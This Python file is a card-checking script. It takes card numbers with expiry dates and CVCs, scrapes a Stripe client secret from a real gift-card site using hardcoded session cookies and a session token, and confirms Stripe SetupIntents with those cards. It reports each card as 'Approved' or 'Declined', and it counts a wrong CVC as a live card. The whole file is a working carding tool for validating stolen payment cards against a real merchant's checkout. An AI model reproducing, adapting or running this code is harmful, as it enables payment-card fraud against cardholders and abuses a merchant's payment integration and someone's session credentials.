import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

@dataclass
class stripe78:
    def main(self, card):
        try:
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            session = Session()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://startplaying.games/gift-card',
                'sec-ch-ua': '"Not=A?Brand";v="99", "Brave";v="151", "Chromium";v="151"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
                'cookie': 'ajs_anonymous_id=beae2c4b-f745-45ff-8078-0fe21b2eff79; first_visit_timestamp=1786586113021; __Host-next-auth.csrf-token=74a6216e30f25ad2ea7a0e0ae7d7a280730a0e5518de4d30309a2b1de64dfc17%7C9cf22ecf6e1d20b0519f51ec98a18201c7762e7786ced10a2d16f081daf1a25a; __stripe_mid=bdf6c1c1-d242-479a-a4c9-5f7e2f9b2f01956e98; __stripe_sid=96dbe545-efbb-462d-8d87-7c4bf57b5238d5523c; ajs_anonymous_id=beae2c4b-f745-45ff-8078-0fe21b2eff79; __Secure-next-auth.callback-url=https%3A%2F%2Fstartplaying.games%2Fgift-card; ajs_user_id=cmsqvhcx300f9i404lt35w7zr; __Secure-next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..GfRHAdVcHyExISXy.GApzIVPJTrsAa-Lmnpjdg2NUIPpVZol2qLQR_GN8u4vV8fJ7aJ6wsajvKpNPoXkdw_DqWOgc6Hd_3Bx2cnNk5hRwx-ia-Yg6Q7IwxVpouUAlTuM2e6o1zRJVwvbVRD_bnDcLZpcry2ve-BPNzy2WyywurZeBKTsecwVxK6GGMpPJOD9YwOoNdOTGTLu0GkjVvx5midgApTxFTzHluArN8atSCRUJYFF5oEj3HGOjib_FHNplllqpfpSJTiNvhCwa4K0ZEiyTir0YH5GB1PgaBrqohmMpJywfLdBrMv6xBwdd-uNeX54ibKRC8KWRdcvKGPS3dpNo8TVeFWBUDj9oZH96PZ3zKjHmyL9n5CbI-3fYGfjm3qI4byWITl9eNWrAkabyhGzfVADpo7e7URCX-_ohQ9aOKF_H4ST5vHN6MZiCd6-UEpoZ6pkVVmNOqQSTIoD4j7wsM8oSBHkZ7lo2820ptM8A4YRHPz10c9OTDGF0Vvn0LeF-SUXJCVMa1weCPBUTkYhg07MCIrw9rAwG5AbMBF9PwReJw1TxOV3fAn8xny6waRyeq5W3rMiwk_5jVse_ivTpB78VSSZ70aliK5RHcCLSdlSIj7Dkipob4K_H5kLDyA4RFZmE3iAQBrws_mQeNmWjW_SvbipXaAQ6w56EgCTKH-Z6K0dNttuZ1bnhpb7d.KJbTpkmIavz19Upp-ULaaQ',
            }

            response = session.get('https://startplaying.games/gift-card',  headers=headers).text
            client_t = paserX(response, '"clientSecret":"','"')
            client_t2 = client_t.split("_secret_")[0]

            print(client_t)
            print(client_t2)
            headers = {
                'accept': 'application/json',
                'accept-language': 'es-419,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
            }

            data = f'return_url=https%3A%2F%2Fstartplaying.games%2Fgift-card&payment_method_data[billing_details][name]=carlo+albrt&payment_method_data[billing_details][address][line1]=Avenue+Road&payment_method_data[billing_details][address][city]=Norfolk&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=23505&payment_method_data[billing_details][address][state]=VA&payment_method_data[billing_details][phone]=&payment_method_data[type]=card&payment_method_data[card][number]={self.ccs[0]}&payment_method_data[card][cvc]={self.ccs[3]}&payment_method_data[card][exp_year]={self.ccs[2]}&payment_method_data[card][exp_month]={self.ccs[1]}&payment_method_data[allow_redisplay]=limited&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fb88902c17c%3B+stripe-js-v3%2Fb88902c17c%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2Fstartplaying.games&payment_method_data[time_on_page]=176699&payment_method_data[client_attribution_metadata][client_session_id]=af831f36-5e56-46d6-84a9-54c24b7df67a&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&payment_method_data[client_attribution_metadata][elements_session_id]=elements_session_0VUd3fSxWfr&payment_method_data[client_attribution_metadata][elements_session_config_id]=bad76d5e-8485-4c7e-a392-b00777da22e5&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]=address&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&expected_payment_method_type=card&set_as_default_payment_method=false&use_stripe_sdk=true&key=pk_live_51FJ6yILPMkNPdtQPw15xj3J4fbIFxS1GbozU2xLH4IO5kfZimYBtBHmooS9hcBafvsZFUH0yCjYshwQEt4UxSbkG00m0MMXxTt&_stripe_version=2025-09-30.clover&client_attribution_metadata[client_session_id]=af831f36-5e56-46d6-84a9-54c24b7df67a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=standard&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_0VUd3fSxWfr&client_attribution_metadata[elements_session_config_id]=bad76d5e-8485-4c7e-a392-b00777da22e5&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=address&client_secret={client_t}'

            req1 = session.post(
                f'https://api.stripe.com/v1/setup_intents/{client_t2}/confirm',
                headers=headers,
                data=data,
            )
            session.close()

            data = req1.json()

            if data.get('object') == 'setup_intent':
                status = data.get('status')

                if status == 'succeeded':
                    return 'Approved! ✅', 'SetupIntent succeeded'

                elif status == 'requires_payment_method':
                    error = data.get('last_setup_error') or {}
                    message = error.get('message', 'Payment method failed')

                    # Este mensaje lo consideramos APPROVED
                    if message == "Your card's security code is incorrect.":
                        return 'Approved! ✅', message

                    return 'Declined ❌', message

                elif status == 'requires_action':
                    return 'Declined ❌', 'Requires action'

                else:
                    return 'Declined ❌', f'Status: {status}'

            if 'error' in data:
                error = data.get('error') or {}
                message = error.get('message', 'Unknown error')

                # También lo detectamos si viene dentro de error
                if message == "Your card's security code is incorrect.":
                    return 'Approved! ✅', message

                return 'Declined ❌', message

            return 'Declined ❌', 'Respuesta desconocida'
        except Exception as e:
            print(e)
            return 'Declined ❌', str(e)

